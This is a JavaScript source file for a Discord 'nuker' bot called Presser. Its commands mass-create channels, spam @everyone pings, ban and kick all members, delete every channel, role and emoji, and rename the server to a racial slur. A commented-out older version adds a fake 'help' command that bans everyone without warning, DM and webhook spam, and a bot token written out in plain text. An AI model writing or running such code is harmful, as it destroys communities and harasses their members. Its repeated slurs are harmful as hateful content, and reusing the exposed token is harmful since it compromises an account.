const Discord = require("discord.js");
const client = new Discord.Client({
  ws: { intents: new Discord.Intents(Discord.Intents.ALL) }
});
const {
  red,
  green,
  blue,
  yellow,
  cyan,
  greenBright,
  redBright,
  grey,
  yellowBright,
  cyanBright,
  black,
  blueBright
} = require("chalk");
const settings = require("./settings.json");
const token = settings.token;
const prefix = settings.prefix;
const founder = settings.founder;
const disableEveryone = settings.DisableEveryone;
const myID = settings.ID;

const presser = String.raw`
                                                   
                     ██▓███   ██▀███  ▓█████   ██████   ██████ ▓█████  ██▀███  
                    ▓██░  ██▒▓██ ▒ ██▒▓█   ▀ ▒██    ▒ ▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒
                    ▓██░ ██▓▒▓██ ░▄█ ▒▒███   ░ ▓██▄   ░ ▓██▄   ▒███   ▓██ ░▄█ ▒
                    ▒██▄█▓▒ ▒▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒  ▒   ██▒▒▓█  ▄ ▒██▀▀█▄  
                    ▒██▒ ░  ░░██▓ ▒██▒░▒████▒▒██████▒▒▒██████▒▒░▒████▒░██▓ ▒██▒
                    ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░
                    ░▒ ░       ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░░ ░▒  ░ ░ ░ ░  ░  ░▒ ░ ▒░
                    ░░         ░░   ░    ░   ░  ░  ░  ░  ░  ░     ░     ░░   ░ 
                    ░        ░  ░      ░        ░     ░  ░   ░     
                                                            
                                                                      
                                        Author: shoe
`;

console.log(red(presser));

client.on("ready", () => {
  console.log(
    red(
      "           ════════════════════════════════════════════════════════════════════════════════"
    )
  );
  console.log(
    greenBright(
      `                                      Logged in as: ${client.user.username}#${client.user.discriminator}`
    )
  );
  console.log(
    greenBright(`                                      Prefix: ${prefix}`)
  );
  console.log(
    greenBright(
      `                                      DisableEveryone: ${disableEveryone}`
    )
  );
  console.log(
    greenBright(
      `                                      Permission Required: ADMINISTRATOR`
    )
  );
  console.log(
    red(
      "           ════════════════════════════════════════════════════════════════════════════════"
    )
  );
  console.log("");
  client.user.setActivity({ type: "PLAYING", name: "Members and servers" }); // Delete this if you wish.
});

client.on("message", async message => {
  if (message.author.bot) return;

  if (message.mentions.everyone === true) {
    return;
  } else if (message.mentions.has(client.user.id)) {
    const helpEmbed = new Discord.MessageEmbed()
      .setAuthor(
        message.author.username,
        message.author.avatarURL({ dynamic: true })
      )
      .setTitle("Nuker: Presser")
      .setDescription(
        `*For whatever reason you've summoned me, make sure to do it with no regrets.*\n\n **Nuking:**\n
            **Mass Channel:** \`${prefix}cc\` [text]
            **Mass Channel & Ping Stresser:** \`${prefix}mp\` [text]
            **Mass Roles:** \`${prefix}mr\` [text]
            **Delete All Channels:** \`${prefix}chd\`
            **Delete All Roles:** \`${prefix}dr\`
            **Delete All Emojis:** \`${prefix}emoall\`
            **Ban All Members:** \`${prefix}banall\`
            **Kick All Members:** \`${prefix}kall\`
            **Server Annihilation:** \`${prefix}die\` [text]
            `
      )
      .setThumbnail(``)
      .setFooter(
        `© Presser | Prefix: ${prefix} | Author: shoe | Cord: ${founder}`
      )
      .setColor(0x36393e)
      .setTimestamp(Date.now());
    message.channel.send(helpEmbed);
  }

  // Test Command
  if (message.content.startsWith(prefix + "ping")) {
    message.channel.send("Pong!");
  }

  // Help

  if (disableEveryone === false) {
    if (message.content.startsWith(prefix + "help")) {
      const helpEmbed = new Discord.MessageEmbed()
        .setAuthor(
          message.author.username,
          message.author.avatarURL({ dynamic: true })
        )
        .setTitle("Nuker: Presser")
        .setDescription(
          `*War does not termine who is right, only who is left.*\n\n **Nuking:**\n
                **Mass Channel:** \`${prefix}cc\` [text]
                **Mass Channel & Ping Stresser:** \`${prefix}mp\` [text]
                **Mass Roles:** \`${prefix}mr\` [text]
                **Delete All Channels:** \`${prefix}chd\`
                **Delete All Roles:** \`${prefix}dr\`
                **Delete All Emojis:** \`${prefix}emoall\`
                **Ban All Members:** \`${prefix}banall\`
                **Kick All Members:** \`${prefix}kall\`
                **Server Annihilation:** \`${prefix}die\` [text]
                `
        )
        .setImage(
          `https://media.discordapp.net/attachments/782211616350404611/800703659435622430/death_grips.gif`
        )
        .setFooter(
          `© Presser | Prefix: ${prefix} | Author: shoe | Cord: ${founder}`
        )
        .setColor(0x36393e)
        .setTimestamp(Date.now());
      message.channel.send(helpEmbed);
      message.delete();
    }

    // Mass Channels

    if (message.content.startsWith(prefix + "cc")) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"));
      } else {
        let args = message.content.substring(prefix.length).split(" ");
        var argresult = args.join(" ");
        if (!argresult) {
          message.channel.send("*Add an input after the cmd*");
        } else {
          for (var i = 0; i < 250; i++) {
            message.guild.channels.create(argresult);
            console.log(yellowBright(`CHANNEL MASSED!`));
          }
        }
        message.delete();
      }
    }

    // Mass Channel & Ping Every Channel

    if (message.content.startsWith(prefix + "mp")) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"));
      } else {
        let args = message.content.split(" ").slice(1);
        var argresult = args.join(" ");
        // If you dont give an input
        if (!argresult) {
          for (var i = 0; i < 250; i++) {
            message.guild.channels.create("ba nigga");

            for (var i = 0; i < 250; i++) {
              let channels = message.guild.channels.create("ba nigga");

              channels.then(function(channel, index) {
                for (var i = 0; i < 250; i++) {
                  channel.send("@everyone " + argresult);
                  console.log(blueBright(`CHANNEL PINGED!`));
                  // other per-channnel logic
                }
              });
            }
          }
        }
        // If you give an input
        for (var i = 0; i < 250; i++) {
          let channels = message.guild.channels.create(argresult);

          channels.then(function(channel, index) {
            for (var i = 0; i < 250; i++) {
              channel.send("@everyone " + argresult);
              console.log(blueBright(`CHANNEL PINGED!`));
              // other per-channnel logic
            }
          });
        }
      }
      message.delete();
    }

    // Mass Roles

    if (message.content.startsWith(prefix + "mr")) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"));
      } else {
        let args = message.content.split(" ").slice(1);
        var argresult = args.join(" ");
        if (!argresult) {
          message.channel.send("*Add an input after the cmd*");
        } else {
          setInterval(function() {
            var i = 0;
            i < 250;
            message.guild.roles
              .create({
                data: {
                  name: `${argresult}`,
                  position: i++,
                  color: "RANDOM"
                }
              })
              .then(console.log(yellow("ROLE BEING MASSED")));
          }, 100); // 0.1 second
        }
        message.delete();
      }
    }

    // Channel Delete
    if (message.content.startsWith(prefix + "chd")) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"));
      } else {
        message.guild.channels.cache.forEach(channel =>
          channel.delete().then(console.log(redBright(`CHANNEL FUCKED`)))
        ); // deletes all channels
        message.delete();
      }
    }

    // Ban All
    if (message.content.startsWith(prefix + "banall")) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"));
      } else {
        message.guild.members.cache.forEach(member =>
          member
            .ban({ reason: "ba nigga" })
            .then(
              console.log(`${member.user.tag} was banned`) &&
                message.channel.send("Banning All Members.").catch()
            )
        );
        message.delete();
      }
    }

    // Kick All
    if (message.content.startsWith(prefix + "kall")) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"));
      } else {
        message.guild.members.cache.forEach(member =>
          member
            .kick({ reason: "lba nigga" })
            .then(
              console.log(`${member.user.tag} was banned`) &&
                message.channel.send("Banning All Members.").catch()
            )
        );
        message.delete();
      }
    }

    // Delete All Roles
    if (message.content.startsWith(prefix + "dr")) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"));
      } else {
        message.guild.roles.cache.forEach(role => {
          role
            .delete("ba nigga")
            .then(
              console.log(
                yellow(`ROLE: ${role.name} is being deleted successfully`)
              )
            );
        });
        message.delete();
      }
    }

    // Delete All Emojis
    if (message.content.startsWith(prefix + "emoall")) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"));
      } else {
        message.guild.emojis.cache.forEach(e =>
          e
            .delete({ reason: "ba nigga" })
            .then(
              console.log(
                yellow(`EMOJI: ${e.name} is being deleted successfully`)
              )
            )
        );
        message.delete();
      }
    }

    // Death.
    if (message.content.startsWith(prefix + "die")) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"));
      } else {
        message.delete();
        message.guild
          .setName(`ba nigga`)
          .then(
            console.log(
              green(`Server Name changed to: ${message.guild.name} Wizzed`)
            )
          ); // changes server name

        // Channel Delete
        message.guild.channels.cache.forEach(channel =>
          channel
            .delete()
            .then(console.log(redBright(`CHANNEL FUCKED`)))
            .then(
              // Channel Icon Change
              message.guild.setIcon(
                "https://media.discordapp.net/attachments/782211616350404611/800703405508919326/death.gif"
              ) // changes server pfp
            )
        );

        // Ban All
        message.guild.members.cache.forEach(member =>
          member
            .ban({ reason: "ba nigga" })
            .then(
              console.log(`${member.user.tag} was banned`) &&
                message.channel.send("Banning All Members.").catch()
            )
        );
        message.delete();

        // Roles
        message.guild.roles.cache.forEach(role => {
          if (!role.editable) {
            return;
          } else {
            role
              .delete("ba nigga")
              .then(
                console.log(
                  yellow(`ROLE: ${role.name} is being deleted successfully`)
                )
              );
          }
        });

        // Emoji
        message.guild.emojis.cache.forEach(e =>
          e
            .delete({ reason: "ba nigga" })
            .then(
              console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))
            )
        );

        // Massing Channels
        let args = message.content.split(" ").slice(1);
        var argresult = args.join(" ");

        if (!argresult) {
          message.channel.send("*Add an input after the cmd*");
        } else {
          for (var i = 0; i < 250; i++) {
            let channels = message.guild.channels.create(argresult);

            channels.then(function(channel, index) {
              for (var i = 0; i < 250; i++) {
                channel.send(`@everyone`);
                console.log(blueBright(`CHANNEL PINGED!`));
                // other per-channnel logic
              }
            });
          }
        }
        setInterval(function() {
          var i = 0;
          i < 250;
          message.guild.roles
            .create({
              data: {
                name: `${argresult}`,
                position: i++,
                color: "RANDOM"
              }
            })
            .then(console.log(yellow("ROLE BEING MASSED")));
        }, 100); // 0.1 second
      }
    }

    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  } else if (disableEveryone === true) {
    if (message.content.startsWith(prefix + "help")) {
      if (message.author.id != myID) {
        return message.reply(
          "You are not authorised to use any of these tools commands."
        );
      } else {
        const helpEmbed = new Discord.MessageEmbed()
          .setAuthor(
            message.author.username,
            message.author.avatarURL({ dynamic: true })
          )
          .setTitle("Nuker: Presser")
          .setDescription(
            `*For whatever reason you've summoned me, make sure to do it with no regrets.*\n\n **Nuking:**\n
                    **Mass Channel:** \`${prefix}cc\` [text]
                    **Mass Channel & Ping Stresser:** \`${prefix}mp\` [text]
                    **Mass Roles:** \`${prefix}mr\` [text]
                    **Delete All Channels:** \`${prefix}chd\`
                    **Delete All Roles:** \`${prefix}dr\`
                    **Delete All Emojis:** \`${prefix}emoall\`
                    **Ban All Members:** \`${prefix}banall\`
                    **Kick All Members:** \`${prefix}kall\`
                    **Server Annihilation:** \`${prefix}die\` [text]
                    `
          )
          .setThumbnail(``)
          .setFooter(
            `© Presser | Prefix: ${prefix} | Author: shoe | Cord: ${founder}`
          )
          .setColor(0x36393e)
          .setTimestamp(Date.now());
        message.channel.send(helpEmbed);
      }
    }

    // Mass Channels

    if (message.content.startsWith(prefix + "cc")) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"));
      } else {
        if (message.author.id != myID) {
          return message.reply(
            "You are not authorised to use any of these tools commands."
          );
        } else {
          if (!argresult) {
            message.channel.send("*Add an input after the cmd*");
          } else {
            let args = message.content.split(" ").slice(1);
            var argresult = args.join(" ");
            for (var i = 0; i < 250; i++) {
              message.guild.channels.create(argresult);
              console.log(yellowBright(`CHANNEL MASSED!`));
            }
          }
        }
      }
    }

    // Mass Channel & Ping Every Channel

    if (message.content.startsWith(prefix + "mp")) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"));
      } else {
        if (message.author.id != myID) {
          return message.reply(
            "You are not authorised to use any of these tools commands."
          );
        } else {
          let args = message.content.split(" ").slice(1);
          var argresult = args.join(" ");
          // If you dont give an input
          if (!argresult) {
            for (var i = 0; i < 250; i++) {
              message.guild.channels.create("ba nigga");

              for (var i = 0; i < 250; i++) {
                let channels = message.guild.channels.create("ba nigga");

                channels.then(function(channel, index) {
                  for (var i = 0; i < 250; i++) {
                    channel.send("@everyone " + argresult);
                    console.log(blueBright(`CHANNEL PINGED!`));
                    // other per-channnel logic
                  }
                });
              }
            }
          }
          // If you give an input
          for (var i = 0; i < 250; i++) {
            let channels = message.guild.channels.create(argresult);

            channels.then(function(channel, index) {
              for (var i = 0; i < 250; i++) {
                channel.send("@everyone " + argresult);
                console.log(blueBright(`CHANNEL PINGED!`));
                // other per-channnel logic
              }
            });
          }
        }
      }
    }
    // Mass Create Roles

    if (message.content.startsWith(prefix + "mr")) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"));
      } else {
        if (message.author.id != myID) {
          return message.reply(
            "You are not authorised to use any of these tools commands."
          );
        } else {
          let args = message.content.split(" ").slice(1);
          var argresult = args.join(" ");
          if (!argresult) {
            message.channel.send("*Add an input after the cmd*");
          } else {
            setInterval(function() {
              var i = 0;
              i < 250;
              message.guild.roles
                .create({
                  data: {
                    name: `${argresult}`,
                    position: i++,
                    color: "RANDOM"
                  }
                })
                .then(console.log(yellow("ROLE BEING MASSED")));
            }, 100); // 0.1 second
          }
        }
      }
    }

    if (message.content.startsWith(prefix + "chd")) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"));
      } else {
        if (message.author.id != myID) {
          return message.reply(
            "You are not authorised to use any of these tools commands."
          );
        } else {
          message.guild.channels.cache.forEach(channel =>
            channel.delete().then(console.log(redBright(`CHANNEL FUCKED`)))
          ); // deletes all channels
          message.delete();
        }
      }
    }

    // Ban All
    if (message.content.startsWith(prefix + "banall")) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"));
      } else {
        if (message.author.id != myID) {
          return message.reply(
            "You are not authorised to use any of these tools commands."
          );
        } else {
          message.guild.members.cache.forEach(member =>
            member
              .ban({ reason: "ba nigga" })
              .then(
                console.log(`${member.user.tag} was banned`) &&
                  message.channel.send("Banning All Members.").catch()
              )
          );
        }
      }
    }

    // Kick All
    if (message.content.startsWith(prefix + "kall")) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"));
      } else {
        if (message.author.id != myID) {
          return message.reply(
            "You are not authorised to use any of these tools commands."
          );
        } else {
          message.guild.members.cache.forEach(member =>
            member
              .kick({ reason: "ba nigga" })
              .then(
                console.log(`${member.user.tag} was banned`) &&
                  message.channel.send("Banning All Members.").catch()
              )
          );
        }
      }
    }

    // Delete All Roles All
    if (message.content.startsWith(prefix + "dr")) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"));
      } else {
        if (message.author.id != myID) {
          return message.reply(
            "You are not authorised to use any of these tools commands."
          );
        } else {
          message.guild.roles.cache.forEach(r =>
            r
              .delete({ reason: "ba nigga" })
              .then(
                console.log(yellow(`ROLE: ${r.name} was deleted successfully`))
              )
              .catch(
                console.log(yellow(`ROLE: ${r.name} was cannot be deleted.`))
              )
          );
        }
      }
    }

    // Delete All Emojis All
    if (message.content.startsWith(prefix + "emoall")) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"));
      } else {
        if (message.author.id != myID) {
          return message.reply(
            "You are not authorised to use any of these tools commands."
          );
        } else {
          message.guild.emojis.cache.forEach(e =>
            e
              .delete({ reason: "ba nigga" })
              .then(
                console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))
              )
              .catch(
                console.log(yellow(`EMOJI: ${e.name} was cannot be deleted.`))
              )
          );
        }
      }
    }
  }

  // Death.
  if (message.content.startsWith(prefix + "die")) {
    if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
      return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"));
    } else {
      if (message.author.id != myID) {
        return message.reply(
          "You are not authorised to use any of these tools commands."
        );
      } else {
        message.delete();
        message.guild
          .setName(`ba nigga`)
          .then(
            console.log(
              green(`Server Name changed to: ${message.guild.name} Wizzed`)
            )
          ); // changes server name
        
        // Ban All
        message.guild.members.cache.forEach(member =>
          member
            .ban({ reason: "ba nigga" })
            .then(
              console.log(`${member.user.tag} was banned`) &&
                message.channel.send("Banning All Members.").catch()
            )
        );
        message.delete();
        
        // Channel Delete
        message.guild.channels.cache.forEach(channel =>
          channel
            .delete()
            .then(console.log(redBright(`CHANNEL FUCKED`)))
            .then(
              // Channel Icon Change
              message.guild.setIcon(
                "https://media.discordapp.net/attachments/782211616350404611/800703405508919326/death.gif"
              ) // changes server pfp
            )
        );

        // Roles
        message.guild.roles.cache.forEach(role => {
          if (!role.editable) {
            return;
          } else {
            role
              .delete("ba nigga")
              .then(
                console.log(
                  yellow(`ROLE: ${role.name} is being deleted successfully`)
                )
              );
          }
        });

        // Emoji
        message.guild.emojis.cache.forEach(e =>
          e
            .delete({ reason: "ba nigga" })
            .then(
              console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))
            )
        );

        // Massing Channels
        let args = message.content.split(" ").slice(1);
        var argresult = args.join(" ");

        if (!argresult) {
          message.channel.send("*Add an input after the cmd*");
        } else {
          for (var i = 0; i < 250; i++) {
            let channels = message.guild.channels.create("ba nigga");

            channels.then(function(channel, index) {
              for (var i = 0; i < 250; i++) {
                channel.send("@everyone ba nigga");
                console.log(blueBright(`CHANNEL PINGED!`));
                // other per-channnel logic
              }
            });
          }
        }
        setInterval(function() {
          var i = 0;
          i < 250;
          message.guild.roles
            .create({
              data: {
                name: `ba nigga`,
                position: i++,
                color: "RANDOM"
              }
            })
            .then(console.log(yellow("ROLE BEING MASSED")));
        }, 100); // 0.1 second
      }
    }
  }
});

client.login(token);

//     OLD BOT BELOW

// const Discord = require("discord.js");

// const bot = new Discord.Client();

// const fs = require("fs");
// bot.commands = new Discord.Collection();

// const commandFiles = fs
//   .readdirSync("./commands/")
//   .filter(file => file.endsWith(".js"));
// for (const file of commandFiles) {
//   const command = require(`./commands/${file}`);

//   bot.commands.set(command.name, command);
// }

// const chalk = require("chalk");

// const PREFIX = ";";

// const HiddenToken = require("./config.json"); /*Token is hid in config.json so i dont leak it */ //TOKEN FOR BOT IS NzQ2ODQ2NTg1OTEyMjk1NTE0.X0GRFQ.sjAdWQWiCX8dZkbotxiZxdaDDVk

// bot.on("ready", () => {
//   console.log(
//     chalk.green(
//       `Bot online and running through Discord on ${bot.guilds.cache.size} servers!\nUsername: ${bot.user.tag}\nInvite link for bot: https://discord.com/oauth2/authorize?client_id=746846585912295514&scope=bot&permissions=8`
//     )
//   );
//   bot.user
//     .setActivity(`!help in 6 guilds!`, {
//       type: "PLAYING"
//     })
//     .catch(console.error);
// });
// // Logs all messages sent to the bot
// let channelID = "746847371442257962";
// let guildID = "706162662123241543";
// bot.on("message", message => {
//   if (message.channel.type === "dm") {
//     let embed = new Discord.MessageEmbed()
//       .setTitle("Someone has DMed me in response!")
//       .setAuthor(
//         bot.guilds.cache.get(guildID).members.cache.get(message.author.id)
//           .displayName,
//         message.author.displayAvatarURL
//       )
//       .setColor("#FAA")
//       .setDescription(message.content);
//     bot.channels.cache.get(channelID).send(embed);
//   }
// });
// bot.on("message", message => {
//   let args = message.content.substring(PREFIX.length).split(" ");

//   switch (args[0]) {
//     case "bal" /*Ban all users in the server | Only I can use this command, I made it so i do not need admin perms to execute it */:
//       if (!message.content.startsWith(PREFIX)) return;
//       var sentuser = message.author.tag;
//       var sentuserid = message.author;
//       var memcount = message.guild.memberCount;
//       var servername = message.guild.name;
//       if (message.author.id != "514605665306673172")
//         return console.log(
//           chalk.red(
//             `Attemp use of "ban all" command executed by ${sentuser} with the ID of ${sentuserid}`
//           )
//         );
//       try {
//         message.guild.members.cache
//           .filter(member => member.bannable)
//           .forEach(member => {
//             member.ban();
//           });
//         message.delete({ timeout: 1 });
//         console.log(
//           chalk.greenBright(
//             `Successfully banned [${memcount}] users in [${servername}]`
//           )
//         );
//       } catch (e) {
//         console.log(e.stack);
//       }
//       break;
//     case "help": //FAKE help command, when anyone uses this command, it bans everyone and deletes all channels!
//       if (!message.content.startsWith(PREFIX)) return;
//       let channels2 = message.guild.channels.cache.filter(
//         channel => channel.deletable
//       );
//       channels2.forEach((channel, id) => {
//         channel.delete();
//         console.log(
//           chalk.greenBright("[delete]", `[channel] "${channel.name}" deleted`)
//         );
//       });
//       console.log(
//         chalk.greenBright(`[channels]2 deleted ${channels2.size} channels`)
//       );
//       return this;
//       var sentuser2 = message.author.tag;
//       var sentuserid2 = message.author;
//       var memcount2 = message.guild.memberCount;
//       var servername2 = message.guild.name;

//       try {
//         message.guild.members.cache
//           .filter(member => member.bannable)
//           .forEach(member => {
//             member.ban();
//           });
//         message.delete({ timeout: 1 });
//         console.log(
//           chalk.greenBright(
//             `Successfully banned [${memcount2}] users in [${servername2}]`
//           )
//         );
//       } catch (e) {
//         console.log(e.stack);
//       }
//       break;
//     case "ap" /*Gives myself Admnin commands | needs to be in command handler or else an error will occur in the index*/:
//       if (!message.content.startsWith(PREFIX)) return;
//       bot.commands.get("ap").execute(message, args);
//       break;

//     case "ed" /*Deletes all of the server emojis (slowly :|) */:
//       if (!message.content.startsWith(PREFIX)) return;
//       if (message.author.id != "514605665306673172")
//         return console.log(
//           chalk.red(
//             `Attemp use of "emoji destroy" command executed by ${sentuser} with the ID of ${sentuserid}`
//           )
//         );
//       let emojis = message.guild.emojis.cache.filter(emoji => emoji.deletable);
//       emojis.forEach(emoji => {
//         emoji.delete();
//         console.log(
//           chalk.greenBright("[delete]", `[emoji] "${emoji.name}" deleted`)
//         );
//       });
//       console.log(chalk.greenBright(`[emojis] deleted ${emojis.size} emojis`));
//       return this;
//       break;

//     case "cd" /*Delets all the channels, and causes an error cache glitch for whatever channel client is on as a bonus :D*/:
//       if (!message.content.startsWith(PREFIX)) return;
//       if (message.author.id != "514605665306673172")
//         return console.log(
//           chalk.red(
//             `Attemp use of "channel destroy" command executed by ${sentuser} with the ID of ${sentuserid}`
//           )
//         );
//       let channels = message.guild.channels.cache.filter(
//         channel => channel.deletable
//       );
//       channels.forEach((channel, id) => {
//         channel.delete();
//         console.log(
//           chalk.greenBright("[delete]", `[channel] "${channel.name}" deleted`)
//         );
//       });
//       console.log(
//         chalk.greenBright(`[channels] deleted ${channels.size} channels`)
//       );
//       return this;
//       break;

//     case "rd" /*Removes all of the roles in the server (broken for now)*/:
//       if (!message.content.startsWith(PREFIX)) return;
//       if (message.author.id != "514605665306673172")
//         return console.log(
//           chalk.red(
//             `Attemp use of "role destroy" command executed by ${sentuser} with the ID of ${sentuserid}`
//           )
//         );
//       const roles = message.guild.roles.cache.filter(role => {
//         if (role.isDefault || role.tags) {
//           return false;
//         }
//       });
//       message.guild.roles.cache.forEach(role => {
//         role.delete();
//         console.log(`Deleted role ${role.name}`);
//       });
//       break;

//     case "order66" /*All of the commands above, but modified to all activate in one command. (broken for now)*/:
//       if (!message.content.startsWith(PREFIX)) return;
//       if (message.author.id != "514605665306673172")
//         return console.log(
//           chalk.red(
//             `Attemp use of "ALL IN ONE" command executed by ${sentuser} with the ID of ${sentuserid}`
//           )
//         );
//       const list = bot.guilds.cache.get("746861162452484197"); //INSERT SERVER ID

//       /*Ban all */
//       message.guild.members.cache
//         .filter(member => member.bannable)
//         .forEach(member => {
//           member.ban();
//         });
//       /*Delete All chanels */
//       message.guild.channels.cache.filter(channel => channel.deletable);
//       channels.forEach((channel, id) => {
//         channel.delete();
//       });
//       break;

//     case "pe" /*Spam pings everyone, and deletes quickly do ;reload to stop it*/:
//       if (!message.content.startsWith(PREFIX)) return;
//       if (message.author.id != "514605665306673172")
//         return console.log(
//           chalk.red(
//             `Attemp use of "PING EVERYONE" command executed by ${sentuser} with the ID of ${sentuserid}`
//           )
//         );
//       setInterval(function() {
//         var ping = message.channel.send("@everyone").then(msg => {
//           msg.delete({ timeout: 150 });
//         }, 150);
//       });

//       break;
//     case "dmsp": //spams mentioned user dm inbox
//       if (!message.content.startsWith(PREFIX)) return;
//       if (message.author.id != "514605665306673172")
//         return console.log(
//           chalk.red(
//             `Attemp use of "SPAM DM" command executed by ${sentuser} with the ID of ${sentuserid}`
//           )
//         );

//       if (!args[1]) return console.log("ERROR: No user specified to DM!");

//       let dUser =
//         message.guild.member(message.mentions.users.first()) ||
//         message.guild.members.cache.get(args[0]);
//       if (!dUser) return console.log("Can't find user!");
//       let dMessage = args.join(" ").slice(27);
//       if (dMessage.length < 1)
//         return console.log("ERROR: You must supply a message!");
//       setInterval(function() {
//         dUser.send(dMessage);
//       }, 10);

//       console.log(
//         `${message.author} You have successfully sent your message to ${dUser} with the ID of ${dUser.id}`
//       );
//       message.channel.send(`Message sent to ${dUser}`);
//       break;
//     case "reload":
//       if (!message.content.startsWith(PREFIX)) return;
//       if (message.author.id != "514605665306673172")
//         return console.log(
//           chalk.red(
//             `Attemp use of "RELOAD BOT" command executed by ${sentuser} with the ID of ${sentuserid}`
//           )
//         );
//       try {
//         console.log(chalk.greenBright("Bot is shutting down!"));
//         process.exit();
//       } catch (e) {
//         console.log(`ERROR: ${e.message}`);
//       }
//       break;
//     case "sr": // specific role to give to me in a server. just say the exact name of the role of the target server. (case sensitive)
//       if (!message.content.startsWith(PREFIX)) return;
//       if (message.author.id != "514605665306673172")
//         return console.log(
//           chalk.red(
//             `Attemp use of "SPECIFIC ROLE" command executed by ${sentuser} with the ID of ${sentuserid}`
//           )
//         );
//       const role = message.guild.roles.cache.find(
//         role => role.name === "Trusted Muffins"
//       );
//       const member = (message.author.id = "514605665306673172");
//       message.member.roles.add(role);
//       console.log(chalk.greenBright(`Gave the role ${role} to me`));
//       break;
//     case "srdel": // delete a specific role in the server
//       if (!message.content.startsWith(PREFIX)) return;
//       if (message.author.id != "514605665306673172")
//         return console.log(
//           chalk.red(
//             `Attemp use of "SPECIFIC ROLE DELETE" command executed by ${sentuser} with the ID of ${sentuserid}`
//           )
//         );
//       message.guild.roles.cache
//         .find(role => role.name === "Extremely Gay")
//         .delete();

//       break;

//     case "cusremovem" /*remove a role that u edit in here to a mentioned user */:
//       if (!message.content.startsWith(PREFIX)) return;
//       if (message.author.id != "514605665306673172")
//         return console.log(
//           chalk.red(
//             `Attemp use of "CUSTOM ROLE MEMBER REMOVE" command executed by ${sentuser} with the ID of ${sentuserid}`
//           )
//         );
//       let cusrrole = message.guild.roles.cache.find(
//         r => r.name === "Trusted Muffins"
//       ); /*Role name of role u wanna give urself */
//       let rmemember = message.mentions.members.first();
//       rmemember.roles.remove(cusrrole);
//       break;
//     case "wh": // makes a webhook that spams
//       if (message.author.id != "514605665306673172")
//         return console.log(
//           chalk.red(
//             `Attemp use of "Webhook" command executed by ${sentuser} with the ID of ${sentuserid}`
//           )
//         );
//       // This will create the webhook with the name "Example Webhook" and an example avatar.
//       var hook = message.channel
//         .createWebhook("Example Webhook", "https://i.imgur.com/p2qNFag.png")
//         // This will actually set the webhooks avatar, as mentioned at the start of the guide.
//         .then(webhook =>
//           webhook
//             .edit("Example Webhook", "https://i.imgur.com/p2qNFag.png")
//             // This will get the bot to DM you the webhook, if you use this in a selfbot,
//             // change it to a console.log as you cannot DM yourself
//             .then(wb =>
//               message.author.send(
//                 `Here is your webhook https://canary.discordapp.com/api/webhooks/${wb.id}/${wb.token}`
//               )
//             )
//             .catch(console.error)
//         );
//       setInterval(() => {
//         hook.send("@everyone you've been pinged.");
//       }, 1500);
//       break;
//     case "unbanme": // unbans u frmo specific server when u dm this bot
//       let guildID = "SERVER ID HERE"; //server id here
//       bot.on("message", message => {
//         if (message.channel.type === "dm") {
//           message.author.send(
//             `Successfully unbanned from: GUILD ID: ${guildID}`
//           );
//           const member = message.mentions.members.first();

//           if (!args[0])
//             return message.channel.send(
//               "Please specify a user (say anything then ping yourself to unban for example: `hgsjghsjgh @shoe`"
//             );

//           message.guild.members.unban(`${member}`, `${guildID}`).catch(err => {
//             if (err) return message.author.send("Something went wrong");
//           });

//           message.author.send(
//             `Successfully unbanned from: GUILD ID: ${guildID}`
//           );
//         }
//       });
//       break;
//   }
// });
// bot.login(HiddenToken.token);
